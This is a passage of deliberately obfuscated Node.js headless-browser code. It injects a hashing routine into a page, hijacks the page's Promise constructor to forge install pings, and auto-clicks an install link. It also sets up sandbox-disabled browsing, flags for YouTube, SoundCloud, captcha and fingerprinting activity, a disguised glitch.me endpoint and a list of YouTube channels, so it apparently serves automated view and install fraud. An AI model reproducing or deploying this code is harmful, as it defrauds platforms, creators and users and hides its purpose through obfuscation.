N++], P[N >> -0x14f4 * 0x1 + -0x179 * -0x19 + 0x21 * -0x7b] |= (-0x1 * -0x8c5 + -0x1483 + 0xc3e | L >> -0xb * -0xf8 + -0x71 * 0x9 + 0x1 * -0x6a3 & 0x126f + -0x5 * -0x515 + 0x1 * -0x2b99) << y[0x1 * 0x5a1 + 0x6 * -0x74 + -0x2e6 & N++], P[N >> 0xad * 0x5 + -0x1 * 0x1109 + 0x6a * 0x21] |= (0x1dc7 + 0xee6 + -0x2c2d * 0x1 | L >> -0x2503 + 0x8b2 * 0x2 + 0x13a5 & 0x1 * -0x23d5 + -0x1b24 + 0x3f38) << y[0x1f7f + 0x4e7 + -0x2463 & N++], P[N >> 0xec2 + 0x73d + 0x15fd * -0x1] |= (0x23c1 + -0x22c9 + 0x18 * -0x5 | 0x9ca + 0x235a + 0x9 * -0x4fd & L) << y[-0x148a * -0x1 + 0xed1 * 0x1 + -0x2358 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x20 * 0xd3 + -0x11fb + 0x259 * 0x13 ? (this['block'] = P[0x3d1 * 0x2 + -0x1fe2 + -0x1850 * -0x1], this['start'] = N - (0x16b1 * 0x1 + 0x3 * -0x324 + -0xd05), this['hash'](), this['hashed'] = 0xbd7 + 0x205 * -0x5 + 0x5 * -0x59) : this['start'] = N;
                }
                return this['bytes'] > 0x1 * -0x1811dcfdf + -0xc7 * 0x15475ed + 0x389c57b19 && (this['hBytes'] += this['bytes'] / (-0x99209b2c + 0x1302 * 0x4dfac + -0xbe4 * -0x1a9ddd) << 0x1951 + -0x1 * 0x9c9 + -0xf88, this['bytes'] = this['bytes'] % (0xba6d7154 + -0xeed846b8 + 0x1346ad564)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x1405 + 0x1425 + -0x1 * 0x2829;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xf * -0x43 + 0x1 * 0x1b7f + -0x1 * 0x1782] = this['block'], J[K >> 0x21d8 + -0x29 * 0x58 + 0x13be * -0x1] |= x[0x1e55 + 0x1208 + -0x101e * 0x3 & K], this['block'] = J[0x336 * -0xa + -0xa7a + 0x2aa6], K >= -0x2 * -0x482 + -0x2674 + 0x49 * 0x68 && (this['hashed'] || this['hash'](), J[-0x907 * 0x2 + 0xf7 * 0x1 + 0x1117] = this['block'], J[-0x1adb + -0x1a5e + -0x1 * -0x3549] = J[0x7f * 0x39 + 0x1fdf + -0x3c25] = J[0x1ff0 + -0x7b6 + -0x1838] = J[0x186b + -0x29 * -0xd6 + -0x3aae] = J[0x1a26 + 0xd * -0x1dd + -0x1 * 0x1e9] = J[-0x11e0 + -0x1535 + -0x82 * -0x4d] = J[0x51 * 0x1d + 0x566 * -0x5 + 0x11d7] = J[0x51c + 0x20b3 + -0x2e8 * 0xd] = J[-0x205b + 0x166e + 0x9f5] = J[0x360 + -0x20cb + 0x1 * 0x1d74] = J[0x1 * 0x322 + -0xa18 + -0x4 * -0x1c0] = J[0x1a6a + 0x1920 + 0x337f * -0x1] = J[-0xcb + 0x1d * 0x3b + 0x8 * -0xbb] = J[0x51b * -0x2 + 0x2ef * -0x1 + 0x3 * 0x466] = J[-0x12d + -0x1 * -0xe25 + -0xcea] = J[0x2b * -0x10 + 0x179b + -0x14dc] = 0x642 * -0x4 + -0x8e4 * -0x1 + -0x1024 * -0x1), J[0xa54 * 0x2 + -0x212d + 0x1d * 0x6f] = this['hBytes'] << 0x1 * -0x821 + -0x4e3 * -0x7 + -0x1a11 | this['bytes'] >>> -0x6d * 0x33 + -0x42 * -0x6b + 0x1 * -0x5c2, J[-0xbf * 0x13 + 0x23f0 + -0x4 * 0x56d] = this['bytes'] << -0x16ed + 0x38 * -0x7 + 0x6c * 0x3a, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2218 + 0x1e85 + 0x3a3; J < -0x5 * -0x9d + 0x1 * 0x1c55 + -0x1f16; ++J)
                K = Q[J - (-0xdc6 + 0x1acd + -0xd04)] ^ Q[J - (0x1 * 0x471 + -0x24d8 + 0x169 * 0x17)] ^ Q[J - (0xa4f + -0x1d95 + 0x2 * 0x9aa)] ^ Q[J - (0xbf * -0x2e + -0x1fc3 + 0x4225)], Q[J] = K << -0x1bb9 + 0x95 * -0x27 + 0x3e1 * 0xd | K >>> 0x9f9 * -0x1 + -0x31 * 0xc1 + 0x2f09;
              for (J = 0x1 * 0xa99 + -0x198d + 0xef4; J < -0xf67 * -0x2 + 0xde6 + -0x66 * 0x70; J += 0x11e0 + 0x6 * -0x2dd + -0xad)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1a93 * -0x1 + -0x212a + 0x3bc2 | L >>> -0x400 * 0x6 + -0x8a * -0x44 + -0x99 * 0x15) + (M & N | ~M & O) + P + (0x95f178cd + -0x2acaade4 + -0x10a45150) + Q[J] << 0xdda + -0x1 * -0x53a + -0x1314) << -0x26 * -0x2 + -0x1805 + 0x7ea * 0x3 | P >>> 0x212e + 0x29f + -0x2 * 0x11d9) + (L & (M = M << 0x259 * 0xb + 0x1 * 0x20c4 + -0x3a79 * 0x1 | M >>> -0x206d + -0x20 * 0x1f + 0x244f * 0x1) | ~L & N) + O + (0x888758c * -0xf + 0x5ab * -0x1fa94f + 0x18df5ff92) + Q[J + (-0x25d8 + 0x19ea + 0xbef)] << 0x458 * 0x2 + 0x1 * -0x24b5 + 0x1c05) << 0x1 * 0x1033 + -0x7 * 0x272 + 0xf0 | O >>> 0x13 * 0x1d0 + 0x6 * 0x2fc + -0x343d * 0x1) + (P & (L = L << 0x1910 + 0xbe7 + -0x24d9 | L >>> 0xfd4 + 0x3 * -0x8b0 + 0x51f * 0x2) | ~P & M) + N + (-0x1 * 0x8c0fac4f + 0xa90a0659 + 0x3d881f8f) + Q[J + (0xcb0 + -0x1b2b + 0xe7d)] << -0x1 * 0x209 + 0x11f6 * 0x1 + -0xfed) << 0x2119 + -0x1a * -0x64 + 0x2b3c * -0x1 | N >>> 0x9 * -0x156 + 0x1682 + -0xa61) + (O & (P = P << 0x8 * -0xbe + 0xc79 * 0x1 + -0x66b | P >>> 0x1a0f * -0x1 + -0x1 * -0xcf1 + 0x23 * 0x60) | ~O & L) + M + (-0x838c8477 + -0x1 * -0x5cd2150e + 0x7 * 0x12766a6e) + Q[J + (0x1050 + -0x1e83 + -0xe36 * -0x1)] << 0x1cb * 0x11 + -0xe06 + -0x1075) << 0x1 * 0x15f3 + -0x4f * -0x4b + -0x1 * 0x2d13 | M >>> -0x19 * -0x6e + -0x2c5 + -0x7de) + (N & (O = O << 0x4 * 0x7c3 + 0xd9c + -0x1 * 0x2c8a | O >>> 0x2418 + 0x4e9 * 0x7 + -0x4675) | ~N & P) + L + (-0x1 * 0x5a986861 + -0xdbc9dfa * 0xd + 0x24 * 0x9fdbf53) + Q[J + (-0x987 + -0x1 * 0x2597 + 0x2f22)] << 0x4b * -0x6d + -0x114c + 0x313b, N = N << 0x1106 + -0x2 * 0x2d4 + -0xb40 | N >>> -0x436 + 0x1929 + -0x14f1;
              for (; J < 0x1c88 + -0xa6b + -0x11f5; J += 0x81 * 0x3d + -0x23d7 + 0x45 * 0x13)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1d92 + -0xdb6 + -0xfd7 * 0x1 | L >>> 0x26de + 0xaf4 + 0x31b7 * -0x1) + (M ^ N ^ O) + P + (0x5b67 * 0xd0c1 + 0x2f6bc522 + 0x118d8 * -0xa1f) + Q[J] << 0x7de + -0x2059 + 0x187b) << 0x251f * 0x1 + 0x2371 + -0x488b | P >>> -0x1afb * -0x1 + -0x8 * 0x26c + -0xa * 0xc0) + (L ^ (M = M << -0x10cb * 0x2 + 0x1dbb + 0x3f9 | M >>> 0x1248 + 0x2 * -0x2f3 + -0x21 * 0x60) ^ N) + O + (0x6fc6be46 + 0x78b9e088 + -0x79a6b32d * 0x1) + Q[J + (-0xe0b + 0x1673 * 0x1 + -0x1 * 0x867)] << -0x100f * 0x1 + -0x266a + -0x1 * -0x3679) << -0x1d96 + -0x1 * -0x26c3 + 0x928 * -0x1 | O >>> -0x21d5 + 0x19a6 + 0x84a) + (P ^ (L = L << -0x26f6 + 0x30f * 0x5 + 0x17c9 | L >>> 0x10ef + -0x1ed8 + 0xdeb) ^ M) + N + (0x1229c9 * 0x28d + 0x198b * 0x4d7e7 + 0x1098f1 * -0x391) + Q[J + (0x1 * 0x9eb + -0x2 * 0x11b9 + -0x1 * -0x1989)] << -0x11d7 + -0x2ef * 0xa + 0x2f2d) << 0x1860 + 0xe07 + 0x2662 * -0x1 | N >>> -0x2c4 + 0x19 * 0x11d + -0x163 * 0x12) + (O ^ (P = P << -0x1877 * -0x1 + 0x155a + -0x2db3 | P >>> -0x22ab + -0x21f * -0x7 + 0x13d4) ^ L) + M + (-0x9e87fba2 * 0x1 + 0xbef * -0x44398 + 0x140448a2b) + Q[J + (-0x1c95 + -0x2042 + 0x3cda * 0x1)] << 0x76f + -0x22c * 0xb + 0x1075) << 0x53 + 0x1f67 + -0x1fb5 * 0x1 | M >>> -0x7a9 * 0x3 + -0xb47 + 0x225d) + (N ^ (O = O << 0x109d + 0x1 * -0x649 + -0xa36 | O >>> 0x1f83 + 0x1d * -0x83 + 0x1da * -0x9) ^ P) + L + (-0x4ee5d * -0x2a07 + 0x5351e448 + -0x59dadf99 * 0x2) + Q[J + (0x6d * 0x4d + -0x1ab4 + 0x611 * -0x1)] << -0xe71 + 0x23c7 + -0xaab * 0x2, N = N << 0x38 * 0x97 + -0x3 * 0x7b5 + -0x6d * 0x17 | N >>> -0x1fda + -0x1 * 0x2345 + 0x4321;
              for (; J < 0x2221 + -0x4 * -0x3be + -0x30dd; J += -0x110 + 0xb9f + -0x13 * 0x8e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1ea3 * -0x1 + 0xc * 0x8a + -0x1 * 0x2516 | L >>> -0xbf7 + 0x1fd6 + -0x16 * 0xe6) + (M & N | M & O | N & O) + P - (0xaabf1167 + -0x3 * -0x4596356e + -0x10a9d6e8d * 0x1) + Q[J] << 0x2 * -0x8ff + -0x4 * -0x634 + 0x6 * -0x123) << 0x141b * -0x1 + 0xb2 * 0x31 + -0xdf2 | P >>> 0xb * 0x4a + -0x1 * -0x8a5 + -0xbb8) + (L & (M = M << -0x1156 + 0x220 * -0xe + 0x2f34 | M >>> -0x11 * -0x133 + 0x281 + -0x16e2) | L & N | M & N) + O - (0xcbc380b7 + -0xaeca8faf + 0x53eb521c) + Q[J + (0x6d * 0x17 + 0x1171 + -0x1b3b)] << -0x1 * 0x2349 + 0x1778 + 0xbd1) << 0x505 * 0x5 + -0x1004 + -0x910 | O >>> 0x22c1 + 0x2069 + -0x430f) + (P & (L = L << -0x334 + -0x10b4 + 0x1 * 0x1406 | L >>> 0x3 * 0xc07 + 0x16b0 + 0x865 * -0x7) | P & M | L & M) + N - (0x7e0f727e + 0xfa4c529 + 0x1f * -0xedef1d) + Q[J + (-0x146a + -0x656 + 0x1ac2)] << -0x2 * -0x623 + -0x33 * 0x15 + -0x817) << 0x4f + -0x1d7 * 0x1 + 0x18d | N >>> -0xda7 + 0x2 * 0xf9a + 0x8b9 * -0x2) + (O & (P = P << 0x7 * 0x4a6 + -0x118c + -0xee0 | P >>> 0x543 + -0x240e + -0x1 * -0x1ecd) | O & L | P & L) + M - (-0x7a2971aa + -0x423e58e5 + 0x1 * 0x12d4c0db3) + Q[J + (0x1 * -0x46a + -0x1ee8 + -0x25b * -0xf)] << 0xba2 + 0x145b + 0x1 * -0x1ffd) << 0x2 * -0xdbe + -0xa8e + 0x260f | M >>> -0x97e * -0x3 + -0x17bd + 0x1 * -0x4a2) + (N & (O = O << -0x2684 + -0x11 * -0x148 + 0x86d * 0x2 | O >>> 0x1af2 + -0x29 * -0x97 + -0x331f) | N & P | O & P) + L - (-0x436d3709 + 0x500 * -0x80e22 + 0x423 * 0x35536f) + Q[J + (-0x266e + -0x22fa + 0xfe * 0x4a)] << 0x6 * -0x349 + 0xa22 + 0x2 * 0x4ca, N = N << 0xb03 * 0x1 + -0x202c + 0x1547 * 0x1 | N >>> -0x1748 + -0x683 * -0x5 + -0x945;
              for (; J < -0x2157 + -0xb04 + 0x2cab; J += -0x2 * 0xc2 + 0x25f1 + -0x2 * 0x1234)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5c * 0x1a + 0xd8d + -0x430 * 0x1 | L >>> -0xc68 + 0x2638 * 0x1 + -0x19b5 * 0x1) + (M ^ N ^ O) + P - (0x4493cc23 + 0x42366556 + -0x512cf34f) + Q[J] << -0x92a + -0xf56 + 0x1880) << 0xdcf + -0x3 * 0x4e3 + 0xdf | P >>> 0x21e8 + -0x1bff + -0x5ce) + (L ^ (M = M << -0x1 * 0x203b + 0x12a1 * 0x1 + 0xdb8 | M >>> 0x1ab3 * 0x1 + 0x5 * 0x492 + -0x318b) ^ N) + O - (-0x4fec7 * 0x806 + 0x55ed0296 + 0x7c46c3e) + Q[J + (0x1 * 0x1cea + 0x23d + 0x531 * -0x6)] << -0x157e + -0x1 * -0xf6b + 0x1 * 0x613) << 0x5bb * 0x1 + -0x1 * -0xdd3 + -0x1389 | O >>> -0x5ac + 0x1 * 0x26b + 0x35c) + (P ^ (L = L << -0x1ec7 + 0x9 * 0x2b6 + 0x67f | L >>> 0x6c2 * 0x2 + -0x2 * -0x5f3 + -0x1968) ^ M) + N - (0xf11 * 0x450b9 + -0x2a0c6e76 + 0x1ea57957) + Q[J + (0x1 * -0x761 + 0x1 * 0x1e6b + -0x1708)] << 0x1d61 + -0x1 * -0x1914 + 0x1227 * -0x3) << -0x1989 + -0xb27 + 0x24b5 * 0x1 | N >>> -0x3d * 0x80 + 0x1d34 + 0x167) + (O ^ (P = P << 0x2 * 0x12a3 + 0x177d + -0x3ca5 | P >>> -0x33 + -0x1278 + 0x12ad) ^ L) + M - (0x62d5e21d + -0x1 * -0x1c2d4dbb + -0x12f1049 * 0x3e) + Q[J + (0xea3 * 0x1 + 0x257e + -0x341e * 0x1)] << 0x1b43 * 0x1 + -0x1e0b + 0x2c8) << -0x193a + 0x3c1 * 0x7 + -0x108 | M >>> -0x595 * 0x5 + 0x373 * 0x5 + 0xac5) + (N ^ (O = O << -0x1 * -0x76e + 0xc07 * -0x3 + 0x1cc5 | O >>> -0x142 * -0x7 + -0x22a2 + -0x19d6 * -0x1) ^ P) + L - (-0x10f * 0x2279c6 + 0x2db * -0x19f30b + 0xa435272d) + Q[J + (0x2323 * -0x1 + 0x1284 + 0x10a3)] << 0x16f * -0x5 + 0x1 * 0x25b5 + -0x1e8a, N = N << 0x1896 + 0x6 * -0x665 + 0x6f3 * 0x2 | N >>> 0x68a + 0x1548 + -0x1bd0;
              this['h0'] = this['h0'] + L << 0x1 * -0x2101 + -0x1f7 + 0x175 * 0x18, this['h1'] = this['h1'] + M << -0x1 * -0xcdd + 0x1fd6 + -0x2cb3, this['h2'] = this['h2'] + N << 0x1da2 + -0x410 + -0x1992, this['h3'] = this['h3'] + O << -0x1 * -0x1c81 + 0x10a5 + -0x2d26, this['h4'] = this['h4'] + P << 0x1 * -0x1c3e + 0x68b + 0x15b3;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1673 + -0x10 * 0x14 + 0x1517 * -0x1 & 0x1b64 + -0xef5 + 0x1 * -0xc60] + w[J >> -0x119 + 0x3 * -0x6f2 + 0x1607 * 0x1 & 0x1103 + -0x240f + 0x131b] + w[J >> 0x13 * -0x30 + -0x230b + -0x3 * -0xce5 & -0x22b7 * -0x1 + 0x1 * 0x19e9 + -0x3c91] + w[J >> -0x78a + 0x373 * -0x2 + 0xe80 & 0x1 * -0x226f + -0x7fe + 0x2a7c] + w[J >> -0xd1b + -0xe76 + -0x1 * -0x1b9d & 0x7 * 0x14 + -0x186b + -0x3fd * -0x6] + w[J >> -0x2 * 0x183 + -0x17ae + 0x1abc & 0x241b + -0x15 * -0x59 + 0x1 * -0x2b59] + w[J >> 0x209d + -0x6a * 0x1d + -0x3 * 0x6dd & 0x6e2 * 0x2 + -0x13e2 + 0x11 * 0x5d] + w[-0x1 * 0x1822 + -0x4e5 * -0x3 + 0x982 & J] + w[K >> 0x15f1 + -0x25 * -0xd + 0x1 * -0x17b6 & -0x7e4 * 0x2 + -0x252d * 0x1 + 0x3504] + w[K >> -0x20c3 + -0x3 * -0x368 + 0x16a3 & -0x5 * -0x6b + -0x1 * -0x248f + -0x2697] + w[K >> -0x1c5d + -0x1258 + -0x19d * -0x1d & 0x16 * 0x151 + -0x7b4 + -0x1533 * 0x1] + w[K >> 0x1 * -0xa8b + -0x227e + 0x2d19 & -0x158 * 0xa + 0x1b * -0x139 + 0x2e82] + w[K >> -0x17e4 * -0x1 + -0x1 * 0x665 + -0x1173 & 0x906 + -0x155 * 0x9 + 0x3 * 0x102] + w[K >> -0x1510 + 0xd4f + 0x7c9 & -0x159e + -0x56a + 0x1b17] + w[K >> 0x1e01 + 0x1fbb * -0x1 + 0x1be & 0x4f * -0x4 + 0x627 * 0x5 + -0xa4 * 0x2e] + w[-0x23 * -0x6d + 0x268e + 0x3566 * -0x1 & K] + w[L >> -0x1 * -0x196f + -0x1142 + -0x811 & 0x15cc + -0x1954 + 0x397] + w[L >> -0x449 * 0x5 + -0x1144 + -0x1 * -0x26c9 & -0x11c * 0x6 + -0xed9 + -0xb8 * -0x1e] + w[L >> -0x13f9 * -0x1 + -0x13 * -0x16f + -0x2f22 & 0x1 * -0x71d + 0x151 * 0x7 + -0x1 * 0x20b] + w[L >> 0x751 * -0x1 + 0x1 * -0x110b + 0x186c & 0xb * -0x2d5 + 0x19ef * -0x1 + 0x3925] + w[L >> -0x1728 + 0x1 * 0x236d + -0xc39 & 0x469 + 0x1c6 * 0x15 + 0xa66 * -0x4] + w[L >> -0xa4 * 0x34 + -0x268c + 0x47e4 & 0x1 * 0x743 + -0x477 + -0x2bd * 0x1] + w[L >> 0x3 * -0x941 + 0x26a7 * 0x1 + -0xae0 & -0x21f6 + -0x1 * -0x1b3b + -0x2 * -0x365] + w[-0xc89 * 0x2 + 0x955 + 0xfcc & L] + w[M >> 0xedc + 0x1 * -0x21bf + -0x655 * -0x3 & 0xdc1 + -0x1c0 * -0xe + 0x1 * -0x2632] + w[M >> 0x2 * 0x1326 + -0x1 * 0x77b + -0x1eb9 & -0x1db7 + -0x24d6 + 0x429c] + w[M >> 0xd9d + 0xe53 + -0x1bdc & -0x1c7d + -0x135c + -0x2fe8 * -0x1] + w[M >> 0x19d5 + 0x2191 + -0xd9 * 0x46 & 0x1 * -0x1035 + 0x13bb * 0x1 + 0x1 * -0x377] + w[M >> -0x254e + 0x18b1 * 0x1 + 0xca9 & -0x7f * -0x2 + -0x1cc + 0xdd] + w[M >> 0x3ba + -0x1300 + 0x51a * 0x3 & -0x3 * -0xa31 + 0xd * -0x17 + 0x1d59 * -0x1] + w[M >> 0x19ac + 0x2 * 0x11b8 + 0x7a3 * -0x8 & 0x1874 + -0x1f45 + 0x6e0] + w[0x1595 + -0x13 * -0x1 + -0x733 * 0x3 & M] + w[N >> 0x246 * 0x7 + -0x23ef + -0x1421 * -0x1 & 0x1 * -0xd72 + 0x120b + -0x48a * 0x1] + w[N >> -0x1 * -0x379 + 0x1533 + -0x1894 & -0x52 * 0x50 + 0x14d8 + 0x4d7 * 0x1] + w[N >> 0x10 * 0x23d + -0xb69 + -0x1853 & -0x25 * -0x5 + 0xefe + 0xc * -0x14e] + w[N >> 0x2 * -0x91 + -0x1 * 0x16eb + 0x1 * 0x181d & -0x5c4 + 0x1004 * 0x1 + -0xa31] + w[N >> 0x23da * -0x1 + 0x2 * 0x8d1 + 0x1244 & 0x3e * 0x76 + 0x14 * 0x37 + 0x20d1 * -0x1] + w[N >> 0x2 * 0x925 + -0x166a + -0x2 * -0x214 & -0x1c1d + 0x263e + -0xa12 * 0x1] + w[N >> 0xc0 * 0x6 + 0xa4c + -0xec8 & -0xcbf + 0x1c9a + -0xfcc] + w[-0x2 * -0x309 + -0x773 + 0x170 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1208 + 0x3 * -0x41e + -0x596 & 0xc45 + 0x2508 + -0x304e,
                J >> -0x1 * 0x1233 + 0x1a29 + 0x151 * -0x6 & -0x1 * 0xb73 + 0x1 * 0x929 + 0x349,
                J >> 0xbbc + 0x1 * 0x1fa5 + -0x2b59 & 0xbc1 + 0x25a9 + 0x5 * -0x9af,
                -0x2 * 0x18a + -0x15aa + 0x19bd & J,
                K >> -0x1 * -0x3d1 + 0x12 * -0x181 + -0x1 * -0x1759 & -0x39 * -0x9f + -0x22c * 0x5 + -0x178c,
                K >> 0x4f * -0x25 + 0x1761 + -0x5f3 * 0x2 & 0x1808 + -0x121 + 0x2bd * -0x8,
                K >> 0x65 * -0x1f + 0x2 * -0x129a + 0x57f * 0x9 & -0x542 * -0x5 + -0xc7 * -0x1 + -0x2f * 0x8e,
                -0x1ac * 0xf + -0x1e4d + 0x3860 & K,
                L >> 0x1c8b * 0x1 + -0xaa3 * 0x1 + -0x11d0 & 0x2ff + 0x2b9 * -0x3 + -0x1 * -0x62b,
                L >> -0x19 * 0x43 + -0x1904 * 0x1 + 0x1 * 0x1f9f & 0x3 * -0x395 + -0x4 * 0x88 + 0xdde,
                L >> 0x23 * 0x6d + -0x49 * -0x80 + -0x1 * 0x335f & 0xfc3 + 0x8b * -0xe + 0x1 * -0x72a,
                0x2ab * 0x5 + -0x2053 + 0x13fb & L,
                M >> 0x12eb * -0x1 + -0x22db * 0x1 + -0x7b2 * -0x7 & -0x2db * -0xd + 0x1 * 0x217d + -0x47 * 0xfb,
                M >> 0x225d + 0x11 * -0x6 + -0x21e7 & 0x959 * 0x4 + -0x1435 + -0x1030,
                M >> -0x989 * 0x3 + 0x25 * 0x7 + 0x1ba0 & 0x3 * 0x107 + 0x1 * 0xc1 + -0x2d7,
                0x12 * -0x1ac + -0x119 * -0x17 + 0x5d8 & M,
                N >> 0x1c9 * 0x5 + -0xeb4 + 0x5df & 0x1f * -0x28 + -0x2b * -0xa9 + -0x168c,
                N >> -0x8 * -0x373 + -0x1ccb + -0x11 * -0x13 & -0x3d * -0x77 + -0x7 * -0x453 + -0x39a1,
                N >> -0xdc1 * 0x2 + 0x16 * 0xfa + 0x60e & 0x17fc + -0xb9 * 0xd + -0xd98,
                -0xb * 0x45 + -0x1b6f + 0x1f65 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xa62 + 0x8d2 * 0x4 + -0x2d96), (K = new DataView(J))['setUint32'](0x1d * 0x1 + -0x74a * 0x4 + -0x1d0b * -0x1, this['h0']), K['setUint32'](0x1901 + -0x1520 + 0x1 * -0x3dd, this['h1']), K['setUint32'](-0x193 + 0x1c9f + 0xd * -0x214, this['h2']), K['setUint32'](0x5ba * 0x1 + 0xd3 * 0x9 + 0x7 * -0x1df, this['h3']), K['setUint32'](-0x9e * 0x1c + 0x62b * 0x2 + 0x502, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x27e * 0x5 + 0x1 * -0xf72 + 0x2fc];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1f41 + -0xd81 + -0x11c0;
            J[-0x1143 + -0x11 * -0x125 + -0x119 * 0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x4 * 0x6fd + -0x1425 + -0x6df * -0x7] = L => {
              const Y = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + (Y(0x1c, 'imgv') + '_key=') + encodeURIComponent(N), -0x11c2 * -0x2 + 0x7f * 0x4b + -0x2cc * 0x1a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2151 + 0x1f5b + -0x1f7 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x10f2 + -0x13 * 0xe3 + 0x27a7), Promise['resolve'](0x268b * -0x1 + -0x1869 + 0xe3 * 0x47);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1dbe + 0x16c0 + 0x6fe; j < -0x1290 + 0x6 * 0x84 + 0xf79; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x21dc + 0x233b + -0x15f);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = -0x31fa + -0x1c2c + -0x4f9 * -0x16 + (-0x44 * -0x53 + 0x17 * 0xa3 + -0x18f9) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xdcd + -0x1 * 0x1d82 + 0x2b52) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + Z(0xf, 'KJso'),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x3c * -0xa4 + 0x233 * -0xf + -0xe49 * -0x5; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
